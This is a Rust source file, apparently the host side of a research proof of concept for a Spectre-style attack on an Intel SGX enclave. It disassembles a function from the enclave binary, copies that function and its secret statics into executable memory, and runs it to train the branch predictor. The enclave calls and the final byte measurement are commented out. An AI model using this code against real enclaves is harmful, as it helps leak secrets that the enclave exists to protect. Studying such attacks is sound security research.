// Licensed to the Apache Software Foundation (ASF) under one
// or more contributor license agreements.  See the NOTICE file
// distributed with this work for additional information
// regarding copyright ownership.  The ASF licenses this file
// to you under the Apache License, Version 2.0 (the
// "License"); you may not use this file except in compliance
// with the License.  You may obtain a copy of the License at
//
//   http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing,
// software distributed under the License is distributed on an
// "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
// KIND, either express or implied.  See the License for the
// specific language governing permissions and limitations
// under the License..

use std::num::Wrapping;

extern crate sgx_types;
extern crate sgx_urts;
use sgx_types::*;
use sgx_urts::SgxEnclave;

extern crate minidow;
use minidow::*;

extern crate capstone;
use capstone::prelude::*;

extern crate nix;
use nix::sys::mman::{mmap, mprotect, MapFlags, ProtFlags};

extern crate libc;
use libc::c_void;

static ENCLAVE_FILE: &'static str = "enclave1.signed.so";

extern "C" {
    fn Enclave1_spectre_enclave(eif: sgx_enclave_id_t, retval: *mut uint64_t) -> sgx_status_t;
    fn Enclave1_spectre_test(
        eif: sgx_enclave_id_t,
        measurement_array_addr: u64,
        target_addr: u64,
    ) -> sgx_status_t;
}

fn init_enclave() -> SgxResult<SgxEnclave> {
    let mut launch_token: sgx_launch_token_t = [0; 1024];
    let mut launch_token_updated: i32 = 0;
    let debug = 1;
    let mut misc_attr = sgx_misc_attribute_t {
        secs_attr: sgx_attributes_t { flags: 0, xfrm: 0 },
        misc_select: 0,
    };
    SgxEnclave::create(
        ENCLAVE_FILE,
        debug,
        &mut launch_token,
        &mut launch_token_updated,
        &mut misc_attr,
    )
}

fn main() -> std::io::Result<()> {
    setup_measurements();

    /*
    let enclave = match init_enclave() {
        Ok(r) => {
            println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
            r
        }
        Err(x) => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("[-] Init Enclave Failed: {}!", x.as_str()),
            ));
        }
    };

    let mut addr = 0;

    let result = unsafe { Enclave1_spectre_enclave(enclave.geteid(), &mut addr) };
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }

    println!("[+] Got addr 0x{:x}", addr);
    */

    let cs = Capstone::new()
        .x86()
        .mode(arch::x86::ArchMode::Mode64)
        .syntax(arch::x86::ArchSyntax::Intel)
        .detail(true)
        .build()
        .expect("Failed to create Capstone object");

    // read the file, parse the elf, and extract the code of the targetted function (+ perform the
    // relocation to take care of the layout randomisation)
    let enclave_binary = std::fs::read(ENCLAVE_FILE)?;

    let elf = match goblin::elf::Elf::parse(&enclave_binary) {
        Ok(elf) => elf,
        Err(e) => {
            return Err(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("invalid file format, expected an elf binary: {:?}", e),
            ))
        }
    };

    /*
    let nop = {
        let nop_arr = [0x90];

        cs.disasm_count(&nop_arr, 0, 1)
            .unwrap()
            .iter()
            .next()
            .unwrap()
    };
    */

    let mut minidow_secret_sym = goblin::elf::Sym::default();
    let mut secret_sym = goblin::elf::Sym::default();
    let mut jb_offset = 0;
    let mut jb_dst_addr = 0;
    let mut ret_offset = 0;
    let mut spectre_test_offset = 0;
    let mut spectre_test_size = 0;

    for sym in elf.syms.iter() {
        let symbol_name = elf.strtab.get(sym.st_name).unwrap().unwrap();
        if symbol_name == "MINIDOW_SECRET" {
            minidow_secret_sym = sym;
        } else if symbol_name == "SECRET" {
            secret_sym = sym;
        } else if symbol_name == "spectre_test" {
            spectre_test_offset = sym.st_value as usize;
            spectre_test_size = sym.st_size as usize;

            let asm_code =
                &enclave_binary[spectre_test_offset..spectre_test_offset + spectre_test_size];

            let insns = cs
                .disasm_all(asm_code, sym.st_value)
                .expect("Failed to disassemble");

            for insn in insns.iter() {
                // we assume that there is only one (inconditional) return instruction in the function
                if let Some("jb") = insn.mnemonic() {
                    jb_offset = insn.address();
                    let details = cs.insn_detail(&insn).unwrap();
                    let operands = details.arch_detail().operands();
                    if let capstone::arch::ArchOperand::X86Operand(
                        capstone::arch::x86::X86Operand {
                            op_type: capstone::arch::x86::X86OperandType::Imm(v),
                            ..
                        },
                    ) = operands[0]
                    {
                        jb_dst_addr = v;
                    }
                } else if let Some("ret") = insn.mnemonic() {
                    ret_offset = insn.address();
                    break;
                }
            }
        }
    }

    // map in memory and add a jump at the correct adress
    // see the SgxSpectre paper for more details on why we simulate only the last 32 bits of
    // addresses
    let mapped_array: &mut [u8; 1 << 32] = unsafe {
        let addr = mmap(
            0 as *mut c_void,
            1 << 33,
            ProtFlags::PROT_WRITE | ProtFlags::PROT_READ,
            MapFlags::MAP_PRIVATE | MapFlags::MAP_ANONYMOUS,
            -1,
            0,
        )
        .unwrap();
        println!("Mmapped 8GB of memory at {:p}", addr);

        std::mem::transmute((addr as usize + (1 << 32)) & (!((1 << 32) - 1)))
    };

    println!("Training array allocated at {:p}", mapped_array as *const _);

    let spectre_test_training_fun: extern "C" fn(measurement_array_addr: u64, target_addr: u64) = unsafe {
        let dst_addr = &mut mapped_array[spectre_test_offset] as *mut u8;

        std::ptr::copy(
            &enclave_binary[spectre_test_offset] as *const u8,
            dst_addr,
            spectre_test_size,
        );

        // we need to add the statics too if we want the function to work well
        std::ptr::copy(
            &enclave_binary[minidow_secret_sym.st_value as usize] as *const u8,
            &mut mapped_array[minidow_secret_sym.st_value as usize] as *mut u8,
            minidow_secret_sym.st_size as usize,
        );
        std::ptr::copy(
            &enclave_binary[secret_sym.st_value as usize] as *const u8,
            &mut mapped_array[secret_sym.st_value as usize] as *mut u8,
            secret_sym.st_size as usize,
        );

        // I'm not sadistic enough to put the function in RWX memory.
        println!(
            "Mapping {} bytes as executable at {:p}",
            spectre_test_size, dst_addr
        );
        mprotect(
            // align on a page boundary
            ((dst_addr as usize) & (!((1 << 12) - 1))) as *mut c_void,
            spectre_test_size,
            ProtFlags::PROT_READ | ProtFlags::PROT_EXEC,
        )
        .unwrap();

        std::mem::transmute(dst_addr)
    };

    let target = (Wrapping(secret_sym.st_value) - Wrapping(minidow_secret_sym.st_value)).0;

    // yay, training is now possible!
    spectre_test_training_fun(unsafe { minidow::BASE_ADDR } as u64, target);

    println!("ret_offset: 0x{:x}", ret_offset);
    println!("jb_offset: 0x{:x}", jb_offset);
    println!("jb_dst_addr: 0x{:x}", jb_dst_addr);

    /*
    let result =
        unsafe { Enclave1_spectre_test(enclave.geteid(), minidow::BASE_ADDR as u64, addr) };
    if result != sgx_status_t::SGX_SUCCESS {
        return Err(std::io::Error::new(
            std::io::ErrorKind::Other,
            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
        ));
    }

    println!("{:?}", minidow::measure_byte::<minidow::Spectre>());

    enclave.destroy();
    */

    Ok(())
}
